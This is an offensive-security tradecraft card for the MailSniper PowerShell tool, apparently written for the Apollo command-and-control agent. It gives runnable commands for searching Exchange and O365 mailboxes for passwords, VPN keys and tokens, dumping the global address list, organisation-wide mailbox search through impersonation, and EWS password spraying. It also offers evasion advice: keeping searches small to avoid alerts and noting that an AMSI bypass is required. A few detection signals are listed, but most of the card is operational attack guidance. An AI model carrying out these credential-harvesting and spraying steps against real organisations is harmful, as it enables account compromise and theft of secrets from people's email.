---
name: SharpMailer / MailSniper
category: collection
subcategories: [email-collection, exchange-enumeration, credential-discovery]
tradecraft_tags: [email, exchange, ews, mailsniper, collection, credential-discovery, dotnet]
mitre_attack:
  - id: T1114.001
    name: Email Collection — Local Email Collection
  - id: T1114.002
    name: Email Collection — Remote Email Collection
source:
  url: https://github.com/dafthack/MailSniper
  license: Unknown
  maintained: false
binary_type: powershell-script
binary_filename: MailSniper.ps1
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Exchange Web Services (EWS) API calls for bulk email search generate EWS audit logs
  in Exchange Server. Large-volume email access from a single account in a short time
  is flagged by Microsoft Defender for Office 365. Message Access Auditing (if enabled
  in Exchange/O365) logs every accessed email.
usage_examples:
  - description: Harvest email for credential-containing keywords
    args: "Invoke-SelfSearch -Mailbox user@domain.com -SearchTerms 'password','credential','vpn'"
  - description: Enumerate all mailboxes accessible to current user
    args: "Get-GlobalAddressList"
  - description: Search all accessible mailboxes for credential keywords (Exchange admin path)
    args: "Invoke-GlobalMailSearch -ImpersonationAccount user -Terms 'password','secret'"
  - description: Spray a password against all O365 users via EWS
    args: "Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList users.txt -Password 'Spring2026!'"
opsec_notes: |
  Email collection is high-value for credential material (welcome emails, password
  reset messages, IT tickets). EWS access is logged — bulk searches or large message
  access volumes trigger Exchange/O365 alerts. Targeted searches (small keyword set,
  limited date range, own mailbox first) are lower-risk than broad organization-wide
  harvesting. O365 Unified Audit Log captures all EWS activity if enabled.
gotchas: |
  PowerShell script — requires AMSI bypass before loading. MailSniper is not actively
  maintained (~2018). For modern O365, the EWS API path may require additional authentication
  handling. Organization-wide mailbox search (Invoke-GlobalMailSearch) requires
  ApplicationImpersonation RBAC role — more privilege than standard user.
  PasswordSpray via EWS generates auth attempts in Azure AD sign-in logs (same as MSOLSpray).
related_ttps: [powerview, seatbelt, snaffler, sharpdpapi]
alternatives: [o365-cli, ruler, impacket-imaplib]
common_args:
  Invoke-SelfSearch:
    description: Search the current user's own mailbox for keywords
    typical_values: ["-Mailbox user@domain -SearchTerms 'password','vpn'"]
  -Mailbox:
    description: Mailbox email address to search
    typical_values: ["user@north.sevenkingdoms.local"]
  -SearchTerms:
    description: Comma-separated keywords to search for
    typical_values: ["'password','credential','vpn','secret','token'"]
  Get-GlobalAddressList:
    description: Retrieve the Exchange Global Address List (all mailboxes)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# SharpMailer / MailSniper

MailSniper is a PowerShell-based Exchange/O365 email enumeration and collection tool.
It accesses Exchange via EWS (Exchange Web Services) to search mailboxes for credential
material, enumerate global address lists, and password spray via EWS.

## What Email Contains That's Operationally Valuable

- **Welcome emails** with temporary passwords
- **Password reset messages** with current credentials
- **IT tickets** with troubleshooting notes (credentials, server names)
- **VPN configuration** emails with PSKs or RADIUS secrets
- **Internal service credentials** shared via email
- **SSH key files** sent between developers

## Search Strategy

```powershell
# High-value search terms (start here):
-SearchTerms "password","pwd","credential","secret","token","vpn","psk","key","apikey","api_key"

# Application-specific:
-SearchTerms "RDP","WinSCP","PuTTY","credentials.xml","config"

# Limit to recent (reduces volume):
-StartDate "01/01/2025"
```

## O365 vs On-Premises

| Feature | On-Premises Exchange | O365 |
|---------|---------------------|------|
| EWS endpoint | `https://mail.domain.com/EWS/Exchange.asmx` | `https://outlook.office365.com/EWS/Exchange.asmx` |
| Auth | NTLM or Basic | Modern auth (may block Basic) |
| Audit logging | Optional (Exchange audit) | Unified Audit Log (enabled by default) |

## Apollo-specific note
PowerShell script — requires AMSI bypass first. Use Apollo's powershell_import command.
